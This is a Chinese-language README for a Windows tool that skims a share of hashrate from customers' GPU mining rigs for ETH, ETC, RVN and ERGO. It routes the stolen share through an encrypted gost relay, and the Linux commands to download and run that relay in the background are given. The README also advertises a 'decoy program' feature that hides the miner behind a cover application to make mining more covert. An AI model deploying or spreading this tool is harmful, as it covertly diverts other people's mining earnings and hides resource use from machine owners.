# 本地抽水加密工具使用说明
</p>
</p>
本工具运行在客户显卡矿机上的工具。支持ETH，ETC，RVN，ERGO四大币种抽水
</p>
</p>
运行平台windows 10或以上版本。
</p>
</p>
相对于服务器端口抽水优点：
</p>
（1），抽水操作在本地完成，服务器只起到转发所以不占用服务器资源，2G内存的服务器只要带宽够，可以带N台无限算力的机子，节约服务器开消成本。
</p>
（2），工具采用TLS加密传输，更加安全。
</p>
工具集成了三大挖矿内核，四种主要币种的抽水，并屏蔽掉了内核的抽水功能。让挖矿更安全。
</p>
（4），并带有马甲程序 功能，指定一个马甲程序后，当启动挖矿时同时也会启动马甲程序，并隐藏掉挖矿程序，当关闭马甲程序时将停止挖矿。让挖矿更加的隐蔽。
</p>
</p>
</p>
</p>
## LINUX服务器下操作代码：
</p>
</p>
curl -s -L https://github.com/we-sk-open/netdata/releases/download/gost/gost
</p>
</p>
chmod a+x gost
</p>
</p>
nohup ./gost -L ss+mwss://chacha20:（加密密码）@:入站端口号 > bxdd1 2>&1 &
</p>
</p>
检察代码（查看gost是否正常运行）
</p>
</p>
ps -aux | grep "gost"
</p>
</p>
</p>
## 客户端编辑及编译说明
![编译说明1](https://user-images.githubusercontent.com/100226405/178154638-a7947f3c-0a7b-4ab9-acfe-2c05597f51ca.JPG)
![编译说明2](https://user-images.githubusercontent.com/100226405/178154648-2f9fd23a-e815-4229-b608-41da8db63e21.JPG)
![编译说明3](https://user-images.githubusercontent.com/100226405/178154655-55e03857-1e6f-4543-81fd-583b8696bc51.JPG)
![编译说明4](https://user-images.githubusercontent.com/100226405/178154661-7833045f-b6aa-4b1e-b0c3-29ecbba1c564.JPG)
![编译说明5](https://user-images.githubusercontent.com/100226405/178154669-803a55e7-6b24-41b5-8b8b-ba7a0ffcef56.JPG)
